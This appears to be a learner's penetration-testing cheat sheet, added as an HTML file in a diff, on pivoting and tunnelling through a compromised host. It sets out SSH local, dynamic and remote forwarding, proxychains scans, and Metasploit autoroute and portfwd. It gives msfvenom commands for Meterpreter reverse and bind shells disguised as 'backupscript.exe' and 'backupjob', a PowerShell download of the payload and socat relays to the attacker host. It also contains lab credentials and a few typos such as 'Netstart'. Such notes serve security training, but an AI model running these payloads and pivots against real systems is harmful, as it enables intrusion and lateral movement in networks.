@@ -1,0 +1,201 @@
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>If a host has more than one network adapter, we can likely use it to move to a different network segment.</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments.</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<ul style="list-style-type: undefined;">
+    <li><strong>Ifconfig</strong> &ndash; all network information</li>
+    <li><strong>Netstart -r / &nbsp; ip route</strong> &ndash; routing info</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;color:white;background:navy;">Dynamic Port forwarding with SSH and SOCKS Tunnelling</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="color:white;">&nbsp;</span></p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>SSH Local Port Forwarding</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>ssh -L 1234:localhost:3306 <a href="mailto:Ubuntu@10.129.202.64"><span style="color:windowtext;">Ubuntu@10.129.202.64</span></a></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>-L = tells SSH client to request the SSH server to forward all data we send via port 1234 to localhost:3306 on ubuntu server.</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Confirming port forward with netstat + Nmap</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Netstart -antp | grep 1234</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Nmap -v -sV -p1234 localhost</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Multiple port forwarding:</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:0cm;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>ssh -L 1234:localhost:3306 8080:localhost:80 <a href="mailto:ubuntu@10.129.202.64"><span style="color:windowtext;">ubuntu@10.129.202.64</span></a></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:18.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;background:lime;">Setting up a pivot</span></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Look at ifconfig output &ndash; what interfaces do you have? &ndash; what blocks can you not directly scan?</li>
+    </ul>
+</div>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'><span style="color:windowtext;">Enabling dynamic port forwarding with SSH</span></h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>ssh -D 9050 <a href="mailto:ubuntu@10.129.202.64">ubuntu@10.129.202.64</a></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>-D = request ssh server to enable dynamic port forwarding.</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>We then need proxychains &ndash; as will allow us to route any tools packets over 9050</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'><span style="color:windowtext;">Modifying Proxychains.conf</span></h1>
+<ul class="decimal_type" style="list-style-type: undefined;">
+    <li>Go to /etc/proxychains.conf</li>
+    <li>Add to last line: socks4 127.0.0.1 9050</li>
+</ul>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'><span style="color:windowtext;">Using nmap with proxychains</span></h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>proxychains nmap -v -sn 172.16.5.1-200</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Proxychains only works with full TCP connect scans not half scans</li>
+    </ul>
+</div>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'><span style="color:windowtext;">Enumerating the windows target through proxychains</span></h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>proxychains nmap -v -Pn -sT 172.16.5.19</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'><span style="color:windowtext;">Using Metasploit with proxychains</span></h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>proxychains msfconsole</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'><span style="color:windowtext;">Using xfreerdp with proxychains</span></h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;color:white;background:purple;">Remote/Reverse Port Forwarding with SSH</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Attack host <span style="font-family:Wingdings;">&agrave;</span> victim server (ubuntu) <span style="font-family:Wingdings;">&agrave;</span> victim server (Windows A)</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Creating a windows payload with msfvenom</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<ul style="list-style-type: undefined;">
+    <li>Ip address is the ubuntu ip, and the lport will be 8080 on ubuntu</li>
+    <li>Then you need to - Config &amp; starting multi/handler</li>
+</ul>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Transferring payload to pivot host</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Starting python3 webserver on pivot host (ubuntu server)</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>python3 -m http.server 8123</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Download payload from Windows Target</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Using SSH -R</h1>
+<ul class="decimal_type" style="list-style-type: undefined;">
+    <li>Once downloaded , use ssh remote forwarding to forward the msfconsole listener service on port 8000 to ubuntus servers port 8080.</li>
+    <li>-vN = verbose and not to prompt log in shell</li>
+    <li>-R = tells ubuntu server to listen on targetip:8080 and forward all incoming connections on port 8080 to msfconsole listener on 0.0.0.0:8000 of attack machine</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;background:yellow;">Meterpreter tunnelling and port forwarding</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Creating payload for ubuntu pivot host</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<ul style="list-style-type: undefined;">
+    <li>Start and configure multi/handler and provide all required details</li>
+    <li>Executing the payload on pivot host &ndash; chmod +x backupjob (on ubuntu)</li>
+</ul>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Ping sweep (try atleast twice as building up arp cache takes time)</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>If the firewall allows we can run a ping sweep on the block</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Useful one lines:</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Liunx: for i in {1..254} ;do (ping -c 1 172.16.5.<strong>$</strong>i | grep &quot;bytes from&quot; &amp;) ;done</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>CMD: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Powershell: 1..254 | % {&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;}</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Configuring MSFs Socks proxy</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>use auxiliary/server/socks_proxy</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>set srvport 9050</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>set &nbsp;srvhost 0.0.0.0</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>set version 4a</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Confirming Proxy Server is running:</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Jobs</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>NOTE: may need to change SOCKS4 to SOCKS5 in the /etc/proxychains.conf</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Creating route with autoroute</h1>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Need to tell our socks_proxy odule to route all traffic via our meterpreter session.</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>use post/multi/manage/autoroute</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>set session 1</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>set subnet 172.16.5.0</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>run</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Can also do it like this:</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Run autoroute -s 172.16.5.0/23</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>List Active Route with autoroute</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Run autoroute -p</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;color:#00B050;">Port Forwarding</span></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Use meterpreters portfwd module</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:36.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Creating local TCP relay:</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>portfwd add -l 3300 -p 3389 -r 172.16.5.19</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Generating the windows payload:</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;color:white;background:black;">Socat redirection with a reverse shell</span></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>No ssh tunnel needed</li>
+    </ul>
+</div>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Starting Socat listener</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Socat will listen on localhost on port 8080 and forward all traffic to port 80</li>
+    </ul>
+</div>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:36.0pt;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Creating the windows payload:</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080</p>
+<ul style="list-style-type: undefined;">
+    <li>And transfer the payload</li>
+    <li>Start and configure msfconsole and multi/handler</li>
+</ul>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;background:teal;">Socat redirection with a bind shell</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Payload: msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Starting socat bind shell listener</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;color:white;background:maroon;">SSH for windows: plink.exe</span></p>
+<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>
+    <ul style="margin-bottom:0cm;list-style-type: undefined;">
+        <li style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>Putty link</li>
+    </ul>
+</div>
+<h1 style='margin-top:12.0pt;margin-right:0cm;margin-bottom:0cm;margin-left:0cm;line-height:107%;font-size:21px;font-family:"Calibri",sans-serif;color:black;font-weight:normal;text-decoration:underline;'>Using plink.exe</h1>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>plink -D 9050 ubuntu@10.129.15.50</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:19px;font-family:"Calibri",sans-serif;'><span style="font-size:27px;line-height:107%;background:lime;">SSH pivoting with Sshuttle</span></p>
